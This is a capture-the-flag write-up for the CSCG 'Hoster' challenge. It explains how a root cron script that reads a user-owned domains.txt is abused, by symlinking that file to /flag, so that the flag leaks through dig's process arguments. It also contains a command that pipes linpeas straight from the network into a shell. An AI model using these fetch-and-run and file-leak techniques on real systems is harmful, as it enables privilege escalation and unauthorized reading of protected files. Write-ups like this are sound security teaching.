+++
title = "Hoster"
date = 2023-10-04T13:42:44+02:00
+++


From the CSCG platform we get the following start point: `ssh -p 2222 6bfb5ca42833fe6481fc1f66-1024-hoster@challenge.cscg.live`.
So I connected by ssh and found myself in a pretty standard linux server environment. I looked around and found out that I am the user `ctf`. We own one directory called `config` and in there is only one file called `domains.txt` which we can't access, as it belongs to user and group `root`.
Further investigation showed, that the flag is located in `/flag` and that there is also a file called `run.sh`.
Obviously we cannot read the flag file, this would have been too easy for a medium challenge.
But the `run.sh` is readable to us, and it contains:

```sh
#!/bin/bash

cron
dropbear -FBREkwp 1024
```

Probably we want to get more privileges to read the `/flag` file through on of those commands.

## List processes

Then, I looked further with `ps auxe` what processes are running and saw that there is a `dropbear -FBREkwp 1024`. As I didn't know what it's purpose was I looked it up. It is a neat little ssh server. So I tried to connect to port 1024, but this is not possible as I get `Connection refused`. Next, I noticed that the ssh command contains `1024` and opening another connection to port 2222 results in another `dropbear` command in the processes. So that is how CSCG handles their ssh connections. The option `-B` stands for `Allow blank logins`, so there is no need to type in a password.
All in all `dropbear` is not the important part for the challenge, as it hosts the challenge.

## Another interesting process

So `/run.sh` has another command called `cron`. Cronjobs are being executed by `crontab` e.g. hourly or minutely. So let's list them:

```sh
...
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

Unfortunately, we can see running cronjobs from root, as we are not in its group.

## Linpeas and a discovery

So in my despair I ran `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`. This executes the script called linpeas which looks for unfamiliar files, which may be used for privilege escalations.
After looking through it for several minutes I stumbled upon `Unexpected in /opt (usually empty)` and in there a directory called `scripts`. In this directory I found the following bash script called `request_certificates.sh`:

```sh 
#!/bin/bash

for file in /var/www/*; do
    echo "$file"
    if ([ -f $file/config/domains.txt ])
    then
        while IFS="" read -r p || [ -n "$p" ]
        do
            if ( dig "$p" | grep -q 'NXDOMAIN' ) || ( dig "$p" 2>&1 | grep -q 'Invalid' ) || ( dig "$p" | grep -q 'SERVFAIL' )
            then
                echo "[-] Error resolving the domain"
            else
                curl -I "$p"
                # certbot -d "$p"
            fi
        done < $file/config/domains.txt
    else
        echo "[-] Not a file"
    fi
```

So this script uses each line in domains.txt to first `dig` and then `curl` it to see if it's online.
The `certbot` command is commented out and not important for us.
Maybe it is possible to break out of those commands and read the flag? But how?
One possibility would be, that cron of the root user uses the request_certificates.sh and requests them regularly, like each minute.
So we could try to modify the `domains.txt` to see what will happen exactly.
As the directory `config` belongs to us, we can remove it and create a new one with a new `domain.txt`. In there we type `example.com`. Fortunately, we can execute `request_certificates.sh`, as we do this and the domain `example.com` is being digged and curled.
We create a new cronjob with `crontab -e` to see if domains.txt is called. So we enter: `* * * * * /opt/scripts/request_certificates.sh`.
We watch the `ps auxf` command, to see if it will be executed, via `while sleep 0.5; do ps auxf; done`.
To following is being executed minutely:

```sh
...
root        1223  0.0  0.0   7020  3308 ?        S    14:00   0:00  \_ CRON
root        1224  0.0  0.0   2888  1008 ?        Ss   14:00   0:00      \_ /bin/sh -c /opt/scripts/request_certificates.sh
root        1226  0.0  0.0   4360  3068 ?        S    14:00   0:00          \_ /bin/bash /opt/scripts/request_certificates.sh
root        1230  0.0  0.0   4360   252 ?        S    14:00   0:00              \_ /bin/bash /opt/scripts/request_certificates.
root        1231  0.0  0.0 132568 12820 ?        Sl   14:00   0:00                  \_ dig example.com
...
```

So far so good, we see that dig uses the first line as command argument.

Is it now somehow possible, that we can curl `/flag` or something similar? The request script uses `$p` in quotation marks, maybe this could be helpful.
Maybe we could read the file through the `"$p"`. But how could we read the file? Well, if we try symlinking the domains.txt to the flag, then it is called in the processes and reads it. So let's try that.
First, we need to remove domains.txt again, so that we can create a symlink. We symlink the flag to domains like so: `ln -s /flag domains.txt`.
And if we watch again, with `while true; do ps aux | grep dig; done`, we see this:

```sh
root        6379  0.0  0.0  25220  2092 ?        R    14:25   0:00 dig CSCG{1nject1ng_0pti0ns_1nste4d_of_c0mm4nds}
```

So there is our flag, yay. And all due to symlinks and command arguments which show in the processes, hooray.
